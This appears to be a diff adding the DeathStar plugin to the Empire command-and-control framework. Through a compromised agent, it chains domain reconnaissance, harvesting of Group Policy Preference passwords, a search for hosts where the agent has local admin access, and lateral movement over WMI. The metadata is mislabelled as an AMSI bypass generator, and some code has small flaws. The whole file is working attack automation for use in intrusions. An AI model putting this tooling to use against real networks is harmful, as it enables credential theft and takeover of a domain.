@@ -1,0 +1,230 @@
+from __future__ import print_function
+
+import logging
+
+from empire.server.api.v2.agent.agent_task_dto import ModulePostRequest
+from empire.server.common.plugins import Plugin
+from empire.server.core.db import models
+from empire.server.core.db.base import SessionLocal
+from empire.server.core.db.models import PluginTaskStatus
+from empire.server.core.hooks import hooks
+from empire.server.core.plugin_service import PluginService
+from empire.server.plugins.DeathStarPlugin.run_tasks import DeathStarTasks
+from empire.server.plugins.DeathStarPlugin.utils import (
+    posh_object_parser,
+    posh_table_parser,
+)
+
+log = logging.getLogger(__name__)
+
+
+class Plugin(Plugin):
+    def onLoad(self):
+        self.info = {
+            'Name': 'deathstar',
+            "Authors": [
+                {
+                    "Name": "Anthony Rose",
+                    "Handle": "@_Cx01N",
+                    "Link": "https://twitter.com/_Cx01N",
+                }
+            ],
+            'Description': ('Generates an AMSI bypass from amsi.fail'),
+            'Software': '',
+            'Techniques': [],
+            'Comments': [
+                'It is a good idea to deploy your own instance of this worker for opsec reasons. It is simple and instructions can be found in the GitHub readme.'
+                'https://github.com/Flangvik/AMSI.fail',
+            ]
+        }
+        self.options = {
+            'Agent': {
+                'Description': 'Name of Agent',
+                'Required': True,
+                'Value': 'Y678CRT1'
+            },
+
+        }
+
+    def execute(self, command, **kwargs):
+        """
+        Parses commands from the API
+        """
+        try:
+            agent_name = command['Agent']
+            user = kwargs["user"]
+            db = kwargs["db"]
+
+            input = f"""
+        _______   _______     ___   .___________. __    __          _______.___________.    ___      .______      
+        |       \ |   ____|   /   \  |           ||  |  |  |        /       |           |   /   \     |   _  \     
+        |  .--.  ||  |__     /  ^  \ `---|  |----`|  |__|  |       |   (----`---|  |----`  /  ^  \    |  |_)  |    
+        |  |  |  ||   __|   /  /_\  \    |  |     |   __   |        \   \       |  |      /  /_\  \   |      /     
+        |  '--'  ||  |____ /  _____  \   |  |     |  |  |  |    .----)   |      |  |     /  _____  \  |  |\  \----.
+        |_______/ |_______/__/     \__\  |__|     |__|  |__|    |_______/       |__|    /__/     \__\ | _| `._____|
+                                         
+        """
+            plugin_task = models.PluginTask(
+                plugin_id=self.info["Name"],
+                input=input,
+                input_full=input,
+                user_id=user.id,
+                status=PluginTaskStatus.completed,
+            )
+            plugin_task.output = f"Starting Recon Scan: {agent_name}\n"
+            db.add(plugin_task)
+            db.flush()
+            self.plugin_task_id = plugin_task.id
+
+            agent = self.main_menu.agentsv2.get_by_id(db, agent_name)
+            self.session_id = agent.session_id
+            self.listener_name = agent.listener
+            params = {
+                     "Agent": self.session_id,
+                     "OutputFunction": "Out-String"
+                }
+            module_post_request = ModulePostRequest(module_id="powershell_management_get_domain_sid",
+                                                    options=params)
+            res, err = self.main_menu.agenttasksv2.create_task_module(db, agent, module_post_request, 0)
+
+            if err:
+                return f"Error running module: {err}z"
+            else:
+                self.task_ids['domain_sid'] = res.id
+            return "Starting DeathStar"
+
+        except Exception as e:
+            log.error(e)
+            self.plugin_service.plugin_socketio_message(self.info["Name"], f"[!] {e}")
+            return False
+
+    def register(self, main_menu):
+        self.installPath = main_menu.installPath
+        self.main_menu = main_menu
+        self.plugin_service: PluginService = main_menu.pluginsv2
+        self.task_ids = {}
+        self.domain_controllers = None
+        self.DeathStarTasks = DeathStarTasks(self.main_menu)
+
+        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_domain_sid", self.get_domain_sid)
+        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_domain_admin", self.get_domain_admin)
+        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_enterprise_admin", self.get_enterprise_admin)
+        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_domain_controller", self.get_domain_controller)
+        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_gpp", self.get_gpp)
+        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_local_admin", self.get_local_admin)
+        hooks.register_hook(hooks.BEFORE_TASKING_RESULT_HOOK, "get_wmi", self.get_invoke_wmi)
+
+
+    def get_invoke_wmi(self, db, task):
+        if 'wmi' in self.task_ids:
+            if task.id in self.task_ids['wmi']:
+                if task.output:
+                    plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+                    plugin_task.output += f"{task.output.decode('UTF-8')}\n"
+                    db.add(plugin_task)
+                    db.flush()
+
+    def get_local_admin(self, db, task):
+        if 'local_admin' in self.task_ids:
+            if task.id == self.task_ids['local_admin']:
+                if task.output:
+                    if b"Find-LocalAdminAccess completed" in task.output:
+                        self.localadmin_access = task.output.decode('utf-8').split("\r\n")[:-3]
+                        plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+                        plugin_task.output += "Local Admin Access found\n"
+                        self.task_ids['wmi'] = []
+                        for computer_name in self.localadmin_access:
+                            self.task_ids['wmi'].append(self.DeathStarTasks.run_invoke_wmi(db, self.session_id, self.listener_name, computer_name))
+                            plugin_task.output += f"Attempting Invoke-WMI to {computer_name}\n"
+                            db.add(plugin_task)
+                            db.flush()
+
+    def get_domain_sid(self, db, task):
+        if 'domain_sid' in self.task_ids:
+            if task.output:
+                if b"Get-DomainSID completed" in task.output:
+                    group_sid = task.output.split()[0].decode("UTF-8")
+                    plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+                    if group_sid != "Get-DomainSID":
+                        plugin_task.output += f"Group SID: {group_sid}\n"
+                        self.task_ids['domain_admin'] = self.DeathStarTasks.run_get_group_member(db, group_sid + "-512", self.session_id)
+                        self.task_ids['enterprise_admin'] = self.DeathStarTasks.run_get_group_member(db, group_sid + "-519", self.session_id)
+                        self.task_ids['domain_controller'] = self.DeathStarTasks.run_get_domain_controller(db, self.session_id)
+                    else:
+                        plugin_task.output += "No group sid found\n"
+                        db.add(plugin_task)
+                        db.flush()
+
+    def get_domain_controller(self, db, task):
+        if 'domain_controller' in self.task_ids:
+            if task.id == self.task_ids['domain_controller']:
+                if task.output:
+                    if b"Get-DomainController completed" in task.output:
+                        plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+                        self.domain_controllers = posh_object_parser(task.output.decode('utf-8'))
+                        plugin_task.output += "Domain Controllers found\n"
+                        db.add(plugin_task)
+                        db.flush()
+                        self.task_ids['gpp'] = self.DeathStarTasks.run_get_gpp(db, self.session_id)
+
+    def get_domain_admin(self, db, task):
+        if 'domain_admin' in self.task_ids:
+            if task.id == self.task_ids['domain_admin']:
+                if task.output:
+                    if b"Get-DomainGroupMember completed" in task.output:
+                        self.domain_admins = posh_object_parser(task.output.decode('utf-8'))
+
+                        plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+                        plugin_task.output += "Domain Admins found\n"
+                        db.add(plugin_task)
+                        db.flush()
+
+    def get_enterprise_admin(self, db, task):
+        if 'enterprise_admin' in self.task_ids:
+            if task.id == self.task_ids['enterprise_admin']:
+                if task.output:
+                    if b"Get-DomainGroupMember completed" in task.output:
+                        self.enterprise_admins = posh_object_parser(task.output.decode('utf-8'))
+
+                        plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+                        plugin_task.output += "Enterprise Admins found\n"
+                        db.add(plugin_task)
+                        db.flush()
+
+    def get_gpp(self, db, task):
+        if 'gpp' in self.task_ids:
+            if task.id == self.task_ids['gpp']:
+                if task.output:
+                    if b"Get-GPPPassword completed" in task.output:
+                        parsed = posh_object_parser(task.output.decode('utf-8'))
+                        gpo = {}
+                        for gpo in parsed:
+                            gpo["guid"] = gpo["file"].split("\\")[6][1:-1]
+                            gpo["passwords"] = gpo["passwords"][1:-1].split(", ")
+                            gpo["usernames"] = gpo["usernames"][1:-1].split(", ")
+
+                            # Gets rid of the "(built-in)" when administrator accounts are found
+                            gpo["usernames"] = [
+                                user.split()[0] if user.lower().find("(built-in)") else user
+                                for user in gpo["usernames"]
+                            ]
+
+                        plugin_task = self.plugin_service.get_task(db, 'deathstar', self.plugin_task_id)
+
+                        if gpo:
+                            plugin_task.output += "GPP found\n"
+                        else:
+                            plugin_task.output += "No GPOs found\n"
+                        db.add(plugin_task)
+                        db.flush()
+                        self.task_ids['local_admin'] = self.DeathStarTasks.run_find_localadmin(db,
+                                                                               self.session_id,
+                                                                               self.domain_controllers[0]['name'],
+                                                                               self.domain_controllers[0]['domain'])
+
+    def shutdown(self):
+        """
+        Kills additional processes that were spawned
+        """
+        #hooks.unregister_filter("get_domain_sid", hooks.BEFORE_TASKING_RESULT_FILTER)
+        pass
